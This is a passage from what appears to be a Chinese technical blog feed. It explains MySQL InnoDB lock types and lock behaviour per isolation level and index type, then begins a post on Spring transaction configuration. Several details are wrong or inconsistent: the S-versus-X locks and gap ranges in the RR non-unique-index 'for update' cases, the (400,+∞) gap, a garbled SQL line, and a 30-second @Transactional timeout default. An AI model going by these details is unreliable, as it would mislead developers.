意向锁存在的目的</h3><p>假设事务T1，用X锁来锁住了表上的几条记录，那么此时表上存在IX锁，即意向排他锁，那么此时事务T2要进行LOCK TABLE…WRITE的表级别锁的请求，可以直接根据意向锁是否存在而判断是否有锁冲突。</p><h3 id="加锁算法"><a class="markdownIt-Anchor" href="#加锁算法"></a> 加锁算法</h3><ul><li>Record Locks：简单翻译为行锁，注意了，该锁是对索引记录进行加锁！锁是在加索引上而不是行上。注意了，innodb一定存在聚簇索引，因此行锁最终都会落到聚簇索引上</li><li>Gap Locks：简单翻译为间隙锁，是对索引的间隙加锁，其目的只有一个，防止其他事物插入数据。在Read Committed隔离级别下，不会使用间隙锁。隔离级别比Read Committed低的情况下，也不会使用间隙锁，如隔离级别为Read UnCommitted时，也不存在间隙锁。当隔离级别为Repeatable Read和Serializable时，就会存在间隙锁</li><li>Next-Key Locks：这个理解为Record Lock+索引前面的Gap Lock。记住了，锁住的是索引前面的间隙！比如一个索引包含值，10、11、13和20。那么，间隙锁的范围如下</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(negative infinity, 10]</span><br><span class="line">(10, 11]</span><br><span class="line">(11, 13]</span><br><span class="line">(13, 20]</span><br><span class="line">(20, positive infinity)</span><br></pre></td></tr></table></figure><h3 id="快照读和当前读"><a class="markdownIt-Anchor" href="#快照读和当前读"></a> 快照读和当前读</h3><p>在mysql中select分为快照读和当前读，执行下面的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=?;</span><br></pre></td></tr></table></figure><p>执行的是快照读，读的是数据库记录的快照版本，是不加锁的（这种说法在隔离级别为Serializable中不成立，后面我会补充）<br />那么，执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=? <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span>;</span><br></pre></td></tr></table></figure><p>会对读取记录加S锁（共享锁），执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=? <span class="keyword">for</span> <span class="keyword">update</span>；</span><br></pre></td></tr></table></figure><p>会对读取记录加X锁（排他锁），那么</p><p><strong>加的是表锁还是行锁呢？</strong></p><p>针对这点，下面是事务的四个隔离级别，他们由弱到强如下所示：</p><ul><li>Read Uncommitted(RU)：读未提交，一个事务可以读到另一个事务未提交的数据！</li><li>Read Committed(RC)：读已提交，一个事务可以读到另一个事务已提交的数据</li><li>Repeatable Read(RR)：可重复读，加入间隙锁，一定程度上避免了幻读的产生！注意了，只是一定程度上，并没有完全避免！另外记住从该级别才开始加入间隙锁</li><li>Serializable：串行化，该级别下读写串行化，且所有的select语句后都自动加上lock in share mode，即使用了共享锁。因此在该隔离级别下，使用的是当前读，而不是快照读</li></ul><p>那么关于是表锁还是行锁，大家可以看到网上最流传的一个说法是这样的：</p><blockquote><p>InnoDB行锁是通过给索引上的索引项加锁来实现的，这一点Mysql与Oracle不同，后者是通过在数据块中对相应数据行加锁来实现。InnoDB这种行锁实现特点意味着：只有通过索引条件检索数据，InnoDB才使用行级锁，否则，InnoDB将使用表锁！</p></blockquote><blockquote><p>上面这句话有两处错误！<br />错误一：并不是用表锁来实现锁表的操作，而是利用了<code>Next-Key Locks</code>，也可以理解为是用了行锁+间隙锁来实现锁表的操作！为了便于说明，举例如下，其中，pid为主键索引。</p></blockquote><table><thead><tr><th>pid(int)</th><th>name(varchar)</th><th>num(int)</th></tr></thead><tbody><tr><td>1</td><td>aaa</td><td>100</td></tr><tr><td>2</td><td>bbb</td><td>200</td></tr><tr><td>7</td><td>ccc</td><td>200</td></tr></tbody></table><p>执行语句（name列无索引）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'aaa'</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>那么此时在pid=1,2,7这三条记录上存在行锁（把行锁住了）。另外，在(-∞,1)(1,2)(2,7)(7,+∞)上存在间隙锁（把间隙锁住了）。因此，给人一种整个表锁住的错觉！</p><p><code>ps:</code>对该结论有疑问的，可自行执行<code>show engine innodb status;</code>语句进行分析。</p><blockquote><p>错误二：所有文章都不提隔离级别</p></blockquote><p>锁表是通过行锁+间隙锁实现的。由于RU和RC都不存在间隙锁，因此，该说法只在RR和Serializable中成立，如果隔离级别为RU和RC，无论条件列上是否有索引，都不会锁表，只锁行</p><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><p>假设有下表如下，pid为主键索引</p><table><thead><tr><th style="text-align:center">pid(int)</th><th style="text-align:center">name(varchar)</th><th style="text-align:center">num(int)</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">aaa</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">bbb</td><td style="text-align:center">200</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">bbb</td><td style="text-align:center">300</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">ccc</td><td style="text-align:center">200</td></tr></tbody></table><h3 id="rcru-条件列非索引"><a class="markdownIt-Anchor" href="#rcru-条件列非索引"></a> RC/RU + 条件列非索引</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span></span><br></pre></td></tr></table></figure><p>不加任何锁，是快照读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span></span><br></pre></td></tr></table></figure><p>不加任何锁，是快照读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>当num=200，有两条记录。这两条记录对应的pid=2、7，因此在pid=2、7的聚餐索引上加行级S锁，采用当前读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>当num&gt;200，有一条记录。这条记录对应的pid=3，因此在pid=3的聚簇索引上加上行级S锁，采用当前读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>当num=200，有两条记录。这两条记录对应的pid=2、7，因此在pid=2、7的聚簇索引上加行级X锁，采用当前读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>当num&gt;200，有一条记录。这条记录对应的pid=3，因此在pid=3的聚簇索引上加上行级X锁，采用当前读</p><h3 id="rcru-条件列是聚簇索引"><a class="markdownIt-Anchor" href="#rcru-条件列是聚簇索引"></a> RC/RU + 条件列是聚簇索引</h3><p>大家知道条件列是主键列，因此pid用的就是聚簇索引，此情况其实和<strong>RC/RU + 条件列非索引</strong>情况是类似的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>不加任何锁，是快照读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid &gt; <span class="number">2</span></span><br></pre></td></tr></table></figure><p>不加任何锁，是快照读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid = <span class="number">2</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>在pid=2的聚簇索引上，加S锁，为当前读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid &gt; <span class="number">2</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>在pid=3、7的聚簇索引上，加S锁，为当前读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid = <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>在pid=2的聚簇索引上，加X锁，为当前读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid &gt; <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>在pid=3、7的聚簇索引上，加X锁，为当前读</p><blockquote><p>为什么条件列加不加索引，加锁情况都是一样的？</p><p>Ok，其实是不一样的。在RC/RU隔离级别中，Mysql Server做了优化。在条件列没有索引的情况下，尽管通过聚簇索引来扫描全表，进行全表加锁。但是，Mysql Server层会进行过滤并把不符合条件的锁当即释放掉，因此你看起来最终结果都是一样的。但是<strong>RC/RU + 条件列非索引</strong>比本例多了一个释放不符合条件的锁的过程！</p></blockquote><h3 id="rcru-条件列是非聚簇索引"><a class="markdownIt-Anchor" href="#rcru-条件列是非聚簇索引"></a> RC/RU + 条件列是非聚簇索引</h3><p>我们在num列上建立非唯一索引，此时有一颗聚簇索引（主键索引，pid）形成的B+索引树，其叶子节点为硬盘上的真实数据。以及另一颗非聚簇索引（非唯一索引num）形成的B+索引树，其叶子节点依然为索引节点，保存了num列的字段值，和对应的聚簇索引</p><p>接下来分析开始</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span></span><br></pre></td></tr></table></figure><p>不加任何锁，快照读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span></span><br></pre></td></tr></table></figure><p>不加任何锁，快照读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>当num=200，由于num列上有索引，因此先在num=200的两条索引记录上加行级S锁。接着，去聚簇索引树上查询，这两条记录对应的pid=2、7，因此在pid=2、7的聚簇索引上加行级S锁，采用当前读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>当num&gt;200，由于num列上有索引，因此先在符合条件的num=300的一条索引记录上加行级S锁。接着，去聚簇索引树上查询，这条记录对应的pid=3，因此在pid=3的聚簇索引上加行级S锁，采用当前读</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>当num=200，由于num列上有索引，因此先在num=200的两条索引记录上加行级X锁。接着，去聚簇索引树上查询，这两条记录对应的pid=2、7，因此在pid=2、7的聚簇索引上加行级X锁，采用当前读</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tab;e where num &gt; 200 for update</span><br></pre></td></tr></table></figure><p>当num&gt;200，由于num列上有索引，因此先在符合条件的num=300的一条索引记录上加行级X锁。接着，去聚簇索引树上查询，这条记录对应的pid=3，因此在pid=3的聚簇索引上加行级X锁，采用当前读</p><h3 id="rrserializable-条件列非索引"><a class="markdownIt-Anchor" href="#rrserializable-条件列非索引"></a> RR/Serializable + 条件列非索引</h3><p>RR级别需要多考虑的就是gap lock，它的加锁特征在于，无论你怎么查都是锁全表，如下所示，分析开始</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span></span><br></pre></td></tr></table></figure><p>在RR级别下，不加任何锁，是快照读。在Serializable级别下，在pid=1、2、3、7（全表所有记录）的聚簇索引上加S锁。并且在聚簇索引的所有间隙(-∞,1)(1,2)(2,3)(3,7)(7,+∞)加gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span></span><br></pre></td></tr></table></figure><p>在RR级别下，不加任何锁，是快照读。在Serializable级别下，在pid=1、2、3、7（全表所有记录）的聚簇索引上加S锁。并且在聚簇索引的所有间隙(-∞,1)(1,2)(2,3)(3,7)(7,+∞)加gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>在pid=1、2、3、7（全表所有记录）的聚簇索引上加S锁，并且在聚簇索引的所有间隔(-∞,1)(1,2)(2,3)(3,7)(7,+∞)加gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>在pid=1、2、3、7（全表所有记录）的聚簇索引上加S锁，并且在聚簇索引的所有间隔(-∞,1)(1,2)(2,3)(3,7)(7,+∞)加gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>在pid=1、2、3、7（全表所有记录）的聚簇索引上加X锁，并且在聚簇索引的所有间隔(-∞,1)(1,2)(2,3)(3,7)(7,+∞)加gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>在pid=1、2、3、7（全表所有记录）的聚簇索引上加X锁，并且在聚簇索引的所有间隔(-∞,1)(1,2)(2,3)(3,7)(7,+∞)加gap lock</p><h3 id="rrserializable-条件列是聚簇索引"><a class="markdownIt-Anchor" href="#rrserializable-条件列是聚簇索引"></a> RR/Serializable + 条件列是聚簇索引</h3><p>大家都知道pid是主键列，因此pid用的就是聚簇索引。该情况的加锁特征在于，如果where后的条件为精确查询（=的情况），那么只存在record lock。如果where后的条件为范围查询（&gt;或&lt;的情况），那么存在的是record lock + gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>在RR级别下，不加任何锁，是快照读；在Serializable级别下，是当前读，在pid=2的聚簇索引上加S锁，不存在gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid &gt; <span class="number">2</span></span><br></pre></td></tr></table></figure><p>在RR级别下，不加任何锁，是快照读。在Serializable级别下，是当前读，在pid=3、7的聚簇索引上加S锁，在(2,3)(3,7)(7,+∞)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid = <span class="number">2</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>是当前读，在pid=2的聚簇索引上加S锁，不存在gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid &gt; <span class="number">2</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>是当前读，在pid=3、7的聚簇索引上加S锁，在(2,3)(3,7)(7,+∞)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid = <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>是当前读，在pid=2的聚簇索引上加X锁</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid &gt; <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>是当前读，在pid=3、7的聚簇索引上加X锁，在(2,3)(3,7)(7,+∞)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid = <span class="number">6</span> [<span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span>|<span class="keyword">for</span> <span class="keyword">update</span>]</span><br></pre></td></tr></table></figure><p><strong>注意了，pid=6是不存在的列，这种情况会在（3，7）加上gap lock</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> pid &gt; <span class="number">18</span> [<span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span>|<span class="keyword">for</span> <span class="keyword">update</span>]</span><br></pre></td></tr></table></figure><p><strong>注意了，pid&gt;18，查询结果是空的。在这种情况下，是在(7,+∞)上加gap lock</strong></p><h3 id="rrserializable-条件列是非聚簇索引"><a class="markdownIt-Anchor" href="#rrserializable-条件列是非聚簇索引"></a> RR/Serializable + 条件列是非聚簇索引</h3><blockquote><p>这里是非聚簇索引，需要区分是否为唯一索引。因为如果是非唯一索引，间隙锁的加锁方式是有区别的<br />先说一下，唯一索引的情况。如果是唯一索引，情况和RR/Serializable+条件列是聚簇索引类似，唯一有区别的是：<strong>这个时候有两颗索引树，加锁是加在对应的非聚簇索引树和聚簇索引树上</strong><br />下面说一下，非聚簇索引是非唯一索引的情况，它和唯一索引的区别就是通过索引进行精确查询后，不仅存在record lock，还存在gap lock。而通过唯一索引进行精确查询后，只存在record lock，老规矩在num列建立非唯一索引</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span></span><br></pre></td></tr></table></figure><p>在RR级别下，不加任何锁，是快照读。在Serializable下，是当前读，在pid=2、7的聚簇索引上加S锁，在num=200的非聚簇索引上加S锁，在(100,200)(200,300)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span></span><br></pre></td></tr></table></figure><p>在RR级别下，不加任何锁，是快照读。在Serializable级别下，是当前读，在pid=3的聚簇索引上加S锁，在num=300的非聚集索引上加S锁。在(200,300)(300,+∞)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>是当前读，在pid=2、7的聚簇索引上加S锁，在num=200的非聚簇索引上加S锁，在(100,200)(200,300)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span> <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p>是当前读，在pid=3的聚簇索引上加S锁，在num=300的非聚集索引上加S锁，在(200,300)(300,+∞)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">200</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>是当前读，在pid=2的聚簇索引上加S锁，在num=200的非聚簇索引上加X锁，在(200,300)(300,+∞)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">200</span> <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>是当前读，在pid=3的聚簇索引上加S锁，在num=300的非聚簇索引上加X锁，在在(200,300)(300,+∞)加上gap lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> = <span class="number">250</span> [<span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span>|<span class="keyword">for</span> <span class="keyword">update</span>]</span><br></pre></td></tr></table></figure><p><strong>注意了，num=250是不存在的列，这种情况会在(200,300)上加gap lock</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">num</span> &gt; <span class="number">400</span> [<span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span>|<span class="keyword">for</span> <span class="keyword">update</span>]</span><br></pre></td></tr></table></figure><p><strong>注意了，pid&gt;400，查询结果为空，在这种情况下，是在(400,+∞)上加gap lock</strong></p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring中常用的两种事务配置方式以及事务的传播性、隔离级别</title>
      <link href="/spring-transactional/"/>
      <url>/spring-transactional/</url>
      
        <content type="html"><![CDATA[<h2 id="注解式事务"><a class="markdownIt-Anchor" href="#注解式事务"></a> 注解式事务</h2><h3 id="事务配置实例"><a class="markdownIt-Anchor" href="#事务配置实例"></a> 事务配置实例</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 定义事务管理器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"transactionManager"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--使用注释事务 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:annotation-driven</span>  <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="transactional"><a class="markdownIt-Anchor" href="#transactional"></a> @Transactional</h3><p>（1）有的把这个注解放在类名称上面了，这样你配置的这个@Transactional 对这个类中的所有public方法都起作用<br />（2）@Transactional 方法方法名上，只对这个方法有作用，同样必须是public的方法</p><h3 id="事务配置中有哪些属性可以配置"><a class="markdownIt-Anchor" href="#事务配置中有哪些属性可以配置"></a> 事务配置中有哪些属性可以配置</h3><p>（1）事务的传播性：<code>@Transactional(propagation=Propagation.REQUIRED)</code><br />​如果有事务，那么加入事务，没有的话新建一个（默认情况下）<br />（2）事务的超时性：<code>@Transactional(timeout=30) //默认是30秒</code><br />​注意这里说的是事务的超时性而不是Connection的超时性<br />（3）事务的隔离级别：<code>@Transactional(isolation = Isolation.READ_UNCOMMITTED)</code><br />​读取未提交数据(会出现脏读, 不可重复读) 基本不使用<br />（4）回滚<br />​指定单一异常类：<code>@Transactional(rollbackFor=RuntimeException.class)</code><br />​指定多个异常类：<code>@Transactional(rollbackFor={RuntimeException.class, Exception.class})</code><br />​该属性用于设置需要进行回滚的异常类数组，当方法中抛出指定异常数组中的异常时，则进行事务回滚<br />（5）只读：<code>@Transactional(readOnly=true)</code><br />​该属性用于设置当前事务是否为只读事务，设置为true表示只读，false则表示可读写，默认值为false</p><h3 